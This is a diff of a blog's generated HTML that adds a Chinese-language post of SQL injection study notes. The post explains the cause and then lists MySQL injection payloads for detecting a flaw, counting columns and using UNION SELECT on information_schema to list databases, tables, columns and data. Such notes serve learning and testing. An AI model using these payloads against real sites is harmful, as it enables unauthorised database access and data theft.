@@ -6,13 +6,16 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2019 | fl4g</title>
+  <title>SQL注入--学习笔记 | fl4g</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="fl4g">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;archives&#x2F;2019&#x2F;index.html">
+  <meta name="description" content="原理将SQL语句作为参数传给web应用程序，让服务器执行恶意的SQL命令，而不去执行原先设计好的数据库命令。假设我们在浏览器中输入URL www.abc.com?id=1 时，我们在URL中传递变量id，并且提供值为1，由于它是对数据库进行动态查询的请求（其中?id＝1表示数据库查询变量），所以我们可以该URL中嵌入恶意SQL语句。   造成SQL注入漏洞原因有两个 ：  没有对输入的数据进行过滤">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入--学习笔记">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;10&#x2F;29&#x2F;SQL%E6%B3%A8%E5%85%A5-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0&#x2F;index.html">
 <meta property="og:site_name" content="fl4g">
+<meta property="og:description" content="原理将SQL语句作为参数传给web应用程序，让服务器执行恶意的SQL命令，而不去执行原先设计好的数据库命令。假设我们在浏览器中输入URL www.abc.com?id=1 时，我们在URL中传递变量id，并且提供值为1，由于它是对数据库进行动态查询的请求（其中?id＝1表示数据库查询变量），所以我们可以该URL中嵌入恶意SQL语句。   造成SQL注入漏洞原因有两个 ：  没有对输入的数据进行过滤">
 <meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-10-29T11:53:54.185Z">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="fl4g" type="application/atom+xml">
@@ -149,49 +152,164 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-SQL注入-学习笔记" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/10/29/SQL%E6%B3%A8%E5%85%A5-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2019-10-29T10:39:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-29</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/10/29/SQL%E6%B3%A8%E5%85%A5-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">SQL注入--学习笔记</a>
+    <h1 class="article-title" itemprop="name">
+      SQL注入--学习笔记
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
+        
+        <a href="/2019/10/29/SQL%E6%B3%A8%E5%85%A5-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2019-10-29T10:39:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>将SQL语句作为参数传给web应用程序，让服务器执行恶意的SQL命令，而不去执行原先设计好的数据库命令。<br>假设我们在浏览器中输入URL <a href="http://www.abc.com?id=1" target="_blank" rel="noopener">www.abc.com?id=1</a> 时，我们在URL中传递变量id，并且提供值为1，由于它是对数据库进行动态查询的请求（其中?id＝1表示数据库查询变量），所以我们可以该URL中嵌入恶意SQL语句。  </p>
+<p>造成SQL注入漏洞原因有两个 ：</p>
+<ul>
+<li>没有对输入的数据进行过滤（过滤输入）</li>
+<li>没有对发送到数据的数据进行转义（转义输出）  </li>
+</ul>
+<h1 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h1><ul>
+<li><code>&#39;#</code> –&gt; 报错，返回数据库错误</li>
+<li><code>&#39; or 1=1#</code> –&gt; 永真条件，返回所有记录</li>
+<li><code>&#39; and 1=2#</code> –&gt; 永假条件，不返回记录  </li>
+<li><code>&#39; or &#39;1&#39;=&#39;1</code></li>
+<li><code>&#39;and &#39;1&#39;=&#39;2</code><br>（有时候单引号不行可以试试双引号）</li>
+</ul>
+<h1 id="利用-information-schema"><a href="#利用-information-schema" class="headerlink" title="利用 information_schema"></a>利用 information_schema</h1><p>information_schema 是 MySQL 中的一个默认数据库，里面存放了其他所有数据库的信息。</p>
+<h2 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h2><p><code>&#39; order by 1#</code> ， <code>&#39; order by 2#</code> 如果列数不存在的话会报错，可以用二分法查询。</p>
+<h2 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h2><ul>
+<li><code>&#39; union select 1, group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#</code></li>
+<li><code>&#39; union select 1, database()#</code><h2 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h2><code>&#39; union select 1, group_concat(TABLE_NAME) from information_schema.TABLES where table_schema = &#39;你想要获取的表名&#39;#</code> <h2 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h2><code>&#39; union select 1, group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_name = &#39;表名&#39;#</code><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><code>&#39; union select 1, group_concat(你想要获取的列名) from 表名#</code></li>
+</ul>
 
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/10/29/SQL%E6%B3%A8%E5%85%A5-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-  
-    </div></section>
+
   
 
-    
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
+  
+
+  
+
+  
+
+  
 
 
           </div>
@@ -214,8 +332,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
